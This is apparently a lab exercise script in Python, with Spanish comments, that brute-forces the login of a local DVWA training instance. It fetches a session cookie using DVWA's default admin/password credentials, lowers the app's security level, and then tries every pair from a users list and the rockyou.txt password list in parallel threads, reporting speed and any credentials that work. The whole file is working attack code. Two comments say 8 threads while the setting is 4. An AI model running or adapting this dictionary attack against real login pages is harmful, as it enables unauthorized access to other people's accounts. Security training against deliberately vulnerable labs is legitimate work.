import requests
from bs4 import BeautifulSoup
import time
import concurrent.futures 
import itertools 

# =================================================================
# CONFIGURACIÓN DEL ENTORNO
# =================================================================
DVWA_URL = "http://localhost:90"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"

# Credenciales para obtener la cookie de sesión
DVWA_USER = "admin"
DVWA_PASS = "password"

# Nombres de los archivos de diccionario
ARCHIVO_USUARIOS = "Users.txt" 
ARCHIVO_CONTRASENAS = "rockyou.txt" 

# Configuración del ataque paralelo
NUM_THREADS = 4 # 💡 MODIFICADO: Solo 8 hilos trabajarán en paralelo.
REPORT_INTERVAL = 60 # Segundos

# =================================================================
# FUNCIONES DE CARGA Y LOGIN
# =================================================================

def load_dictionary(file_path):
    """
    Carga los elementos de un archivo de texto, uno por línea.
    """
    try:
        with open(file_path, 'r', encoding='latin-1') as f:
            return [linea.strip() for linea in f if linea.strip()]
    except FileNotFoundError:
        print(f"[x] Error: El archivo '{file_path}' no fue encontrado.")
        return []

def login_to_dvwa():
    """
    Inicia sesión en DVWA y devuelve la sesión inicial.
    """
    print(f"\n[*] Intentando iniciar sesión en DVWA con {DVWA_USER}/{DVWA_PASS}")
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_tag = soup.find('input', {'name': 'user_token'})
        csrf_token = token_tag.get('value')
        
        login_data = {
            'username': DVWA_USER,
            'password': DVWA_PASS,
            'Login': 'Login',
            'user_token': csrf_token
        }
        
        session.post(LOGIN_URL, data=login_data, timeout=10)
        print("    [!] Sesión de DVWA iniciada con éxito.")
        return session
            
    except Exception as e:
        print(f"    [x] Error al iniciar sesión. Revisa la URL y las credenciales: {e}")
        return None

# =================================================================
# LÓGICA DEL ATAQUE PARALELO
# =================================================================

def attempt_login(user, password, session_cookie):
    """
    Función Worker: Intenta un login con una combinación.
    """
    # Crear una nueva sesión por hilo para Thread Safety
    s = requests.Session()
    
    # Aplicar la cookie de sesión obtenida durante el login
    s.cookies.set('PHPSESSID', session_cookie)
    
    try:
        # Parámetros para la petición GET (DVWA low)
        params = {
            'username': user,
            'password': password,
            'Login': 'Login'
        }
        
        # Petición GET para el ataque
        response = s.get(BRUTE_URL, params=params, timeout=10)
        
        # Criterio de éxito
        if "Welcome to the password protected area" in response.text:
            return f"{user}:{password}"
        
    except requests.exceptions.RequestException:
        # Ignorar errores de conexión y timeout para mantener la velocidad
        pass
        
    return None

def brute_force_attack(session, users_list, passwords_list):
    """
    Ejecuta el ataque de fuerza bruta en paralelo usando ThreadPoolExecutor.
    """
    # Extraer la cookie PHPSESSID de la sesión de login
    phpsessid = session.cookies.get('PHPSESSID')
    if not phpsessid:
        print("[x] Error: No se pudo extraer la cookie PHPSESSID.")
        return []
        
    # Intenta configurar la seguridad a nivel bajo (GET)
    session.get(f"{DVWA_URL}/security.php?security=low&seclev_submit=Submit")
    
    valid_credentials = []
    
    # Generar todas las combinaciones de forma eficiente
    all_combinations = list(itertools.product(users_list, passwords_list))
    total_attempts = len(all_combinations)
    
    attempts_made = 0
    start_time = time.time()
    last_report_time = start_time

    print(f"[*] Iniciando ataque PARALELO ({NUM_THREADS} hilos) contra {total_attempts:,} combinaciones.")
    
    # 💡 ThreadPoolExecutor limitado a 8 hilos
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        
        # Mapea la función attempt_login a todas las combinaciones
        futures = [
            executor.submit(attempt_login, user, password, phpsessid)
            for user, password in all_combinations
        ]

        # Monitorear resultados en tiempo real
        for future in concurrent.futures.as_completed(futures):
            attempts_made += 1
            
            # Obtener el resultado del hilo
            result = future.result()
            
            if result:
                valid_credentials.append(result)
                print(f"\n    [!!!] ¡ÉXITO! Credencial encontrada: {result}")
            
            # Lógica del reporte de progreso (se ejecuta CADA MINUTO)
            current_time = time.time()
            if current_time - last_report_time >= REPORT_INTERVAL:
                elapsed_time = current_time - start_time
                attempts_remaining = total_attempts - attempts_made
                
                # Cálculo de velocidad (intentos/segundo)
                speed = attempts_made / elapsed_time if elapsed_time > 0 else 0
                
                print(f"\n[📊 REPORTE DE PROGRESO 📊]")
                print(f"  Tiempo transcurrido: {elapsed_time/60:.1f} minutos")
                print(f"  Intentos realizados: {attempts_made:,}")
                print(f"  Combinaciones restantes: {attempts_remaining:,}")
                print(f"  Velocidad: {speed:.2f} intentos/segundo ({speed * 60:.2f} intentos/minuto)")
                print("-" * 50)
                
                last_report_time = current_time 
    
    # Reporte final
    end_time = time.time()
    duration = end_time - start_time
    attempts_per_second = attempts_made / duration if duration > 0 else attempts_made

    print(f"\n[🚀 FINALIZADO 🚀]")
    print(f"  Tiempo total: {duration:.2f} segundos")
    print(f"  Velocidad media: {attempts_per_second:.2f} intentos/segundo ({attempts_per_second * 60:.2f} intentos/minuto)")

    return valid_credentials

# =================================================================
# BLOQUE DE EJECUCIÓN PRINCIPAL
# =================================================================

if __name__ == "__main__":
    
    # 1. Cargar diccionarios desde archivos
    USERS = load_dictionary(ARCHIVO_USUARIOS)
    PASSWORDS = load_dictionary(ARCHIVO_CONTRASENAS)

    if not USERS or not PASSWORDS:
        print("[x] Error: No se puede continuar sin listas de usuarios y contraseñas válidas.")
    else:
        # 2. Obtener la sesión de DVWA
        dvwa_session = login_to_dvwa()
        
        if dvwa_session:
            # 3. Ejecutar el ataque PARALELO
            found_credentials = brute_force_attack(dvwa_session, USERS, PASSWORDS)
            
            # 4. Imprimir resultados
            if found_credentials:
                print("\nCREDENCIALES VÁLIDAS ENCONTRADAS EN DVWA:")
                print("========================================")
                for cred in found_credentials:
                    print(f"{cred}")
                print("========================================")
            else:
                print("\nNo se encontraron credenciales válidas en DVWA.")